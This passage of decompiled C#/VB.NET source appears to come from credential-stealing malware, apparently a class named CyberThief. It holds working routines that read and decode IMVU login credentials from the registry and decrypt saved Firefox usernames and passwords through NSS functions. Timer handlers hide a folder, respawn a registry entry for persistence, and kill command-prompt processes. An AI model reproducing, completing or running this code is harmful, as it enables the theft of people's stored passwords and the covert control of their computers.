        object obj2 = NewLateBinding.LateGet(objectValue, (System.Type) null, "regread", Arguments, (string[]) null, (System.Type[]) null, CopyBack);
        if (flagArray[0])
          hKey = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        obj1 = RuntimeHelpers.GetObjectValue(obj2);
        goto label_9;
label_4:
        num2 = -1;
        switch (num1)
        {
          case 2:
            obj1 = (object) null;
            goto label_9;
        }
      }
      catch (Exception ex) when (
      {
        // ISSUE: unable to correctly present filter
        int num3;
        if (ex is Exception & num1 != 0 & num3 == 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        ProjectData.SetProjectError(ex);
        goto label_4;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      object obj3 = obj1;
      if (num2 == 0)
        return obj3;
      ProjectData.ClearProjectError();
      return obj3;
    }

    public string Hex2Ascii(string Text)
    {
      object Left = (object) null;
      object Counter;
      object LoopForResult;
      object CounterResult;
      if (ObjectFlowControl.ForLoopControl.ForLoopInitObj(Counter, (object) 1, (object) Strings.Len(Text), (object) 1, ref LoopForResult, ref CounterResult))
      {
        do
        {
          object Right = (object) CyberThief.Mid(Text, Conversions.ToInteger(CounterResult), 2);
          Left = Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Left, (object) Strings.Chr(checked ((int) Math.Round(Conversion.Val(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject((object) "&h", Right))))));
          CounterResult = Microsoft.VisualBasic.CompilerServices.Operators.AddObject(CounterResult, (object) 1);
        }
        while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
      }
      return Conversions.ToString(Left);
    }

    public string DoToVu()
    {
      string vu;
      if (Microsoft.VisualBasic.CompilerServices.Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.CurrentUser.GetValue("Software\\IMVU\\password"), (object) null, false))
      {
        vu = "";
      }
      else
      {
        string hKey1 = "HKEY_CURRENT_USER\\Software\\IMVU\\username\\";
        string hKey2 = "HKEY_CURRENT_USER\\Software\\IMVU\\password\\";
        vu = Conversions.ToString(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject((object) "IMVU : \r\nUsername : ", this.ReadKey(ref hKey1)), (object) "\r\n"), (object) "Password : "), (object) this.Hex2Ascii(Conversions.ToString(this.ReadKey(ref hKey2)))));
      }
      return vu;
    }

    public string NameOnlyFromFullPath(string FileFullPath)
    {
      int startIndex = checked (FileFullPath.LastIndexOfAny(Conversions.ToCharArrayRankOne("\\")) + 1);
      return FileFullPath.Substring(startIndex, checked (Strings.Len(FileFullPath) - startIndex));
    }

    private void Timer5_Tick(object sender, EventArgs e) => this.hidefolder();

    private void Timer6_Tick(object sender, EventArgs e) => this.RegistryRespawner();

    private void Timer7_Tick(object sender, EventArgs e)
    {
      Process[] processesByName = Process.GetProcessesByName("cmd");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }

    public void FFStealer()
    {
      try
      {
        this.FFPasswords = "[----FireFox Stealer 3.5/3.6----]:\r\n===============================================\r\n";
        bool flag = false;
        string str1 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
        string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
        int index1 = 0;
        while (index1 < directories.Length)
        {
          string str2 = directories[index1];
          if (!flag)
          {
            string[] files = Directory.GetFiles(str2);
            int index2 = 0;
            while (index2 < files.Length)
            {
              string input = files[index2];
              if (!flag)
              {
                if (Regex.IsMatch(input, "signons.sqlite"))
                {
                  FFDecryptor.NSS_Init(str2);
                  FFDecryptor.signon = input;
                }
                checked { ++index2; }
              }
              else
                break;
            }
            checked { ++index1; }
          }
          else
            break;
        }
        string signon = FFDecryptor.signon;
        FFDecryptor.TSECItem tsecItem = new FFDecryptor.TSECItem();
        FFDecryptor.TSECItem result1 = new FFDecryptor.TSECItem();
        FFDecryptor.TSECItem result2 = new FFDecryptor.TSECItem();
        SQLiteBase sqLiteBase = new SQLiteBase(signon);
        DataTable dataTable1 = sqLiteBase.ExecuteQuery("SELECT * FROM moz_logins;");
        DataTable dataTable2 = sqLiteBase.ExecuteQuery("SELECT * FROM moz_disabledHosts;");
        try
        {
          foreach (DataRow row in dataTable2.Rows)
            ;
        }
        finally
        {
          System.Collections.IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        FFDecryptor.PK11_Authenticate(FFDecryptor.PK11_GetInternalKeySlot(), true, 0L);
        try
        {
          foreach (DataRow row in dataTable1.Rows)
          {
            this.FFPasswords = this.FFPasswords + "\r\nURL: " + Convert.ToString(row["formSubmitURL"].ToString());
            StringBuilder inStr1 = new StringBuilder(row["encryptedUsername"].ToString());
            IntPtr num = new IntPtr(FFDecryptor.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr1, inStr1.Length));
            FFDecryptor.TSECItem structure1 = (FFDecryptor.TSECItem) Marshal.PtrToStructure(num, typeof (FFDecryptor.TSECItem));
            if (FFDecryptor.PK11SDR_Decrypt(ref structure1, ref result1, 0) == 0 && result1.SECItemLen != 0)
            {
              byte[] numArray = new byte[checked (result1.SECItemLen - 1 + 1)];
              num = new IntPtr(result1.SECItemData);
              Marshal.Copy(num, numArray, 0, result1.SECItemLen);
              this.FFPasswords = this.FFPasswords + "\r\nUsername: " + Encoding.ASCII.GetString(numArray);
            }
            StringBuilder inStr2 = new StringBuilder(row["encryptedPassword"].ToString());
            num = new IntPtr(FFDecryptor.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr2, inStr2.Length));
            FFDecryptor.TSECItem structure2 = (FFDecryptor.TSECItem) Marshal.PtrToStructure(num, typeof (FFDecryptor.TSECItem));
            if (FFDecryptor.PK11SDR_Decrypt(ref structure2, ref result2, 0) == 0 && result2.SECItemLen != 0)
            {
              byte[] numArray = new byte[checked (result2.SECItemLen - 1 + 1)];
              num = new IntPtr(result2.SECItemData);
              Marshal.Copy(num, numArray, 0, result2.SECItemLen);
              this.FFPasswords = this.FFPasswords + "\r\nPassword: " + Encoding.ASCII.GetString(numArray) + "\r\n\r\n";
            }
          }
        }
        finally
        {
          System.Collections.IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void BackgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
    {
    }

    private void BackgroundWorker2_ProgressChanged(object sender, ProgressChangedEventArgs e)
    {
      if (e.ProgressPercentage == 50)
        this.DataDB = false;
      if (e.ProgressPercentage != 100)
        return;
      this.DataDB = true;
    }

    public struct StringIndexHeader
    {
      public int dwWICK;
      public int dwStructSize;
      public int dwEntriesCount;
      public int dwUnkId;
      public int dwType;
      public int dwUnk;
    }

    public struct StringIndexEntry
    {
      public int dwDataOffset;
      public System.Runtime.InteropServices.ComTypes.FILETIME ftInsertDateTime;
      public int dwDataSize;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct INTERNET_CACHE_ENTRY_INFO
    {
      public int dwStructSize;
      [MarshalAs(UnmanagedType.LPTStr)]
      public string lpszSourceUrlName;
      [MarshalAs(UnmanagedType.LPTStr)]
      public string lpszLocalFileName;
      public int CacheEntryType;
      public int dwUseCount;
      public int dwHitRate;
      public int dwSizeLow;
      public int dwSizeHigh;
      public System.Runtime.InteropServices.ComTypes.FILETIME LastModifiedTime;
      public System.Runtime.InteropServices.ComTypes.FILETIME ExpireTime;
      public System.Runtime.InteropServices.ComTypes.FILETIME LastAccessTime;
      public System.Runtime.InteropServices.ComTypes.FILETIME LastSyncTime;
      public IntPtr lpHeaderInfo;
      public int dwHeaderInfoSize;
      public IntPtr lpszFileExtension;
      public int dwExemptDelta;
    }

    private struct DATA_BLOB
    {
      public int cbData;
      public IntPtr pbData;
    }
  }
}
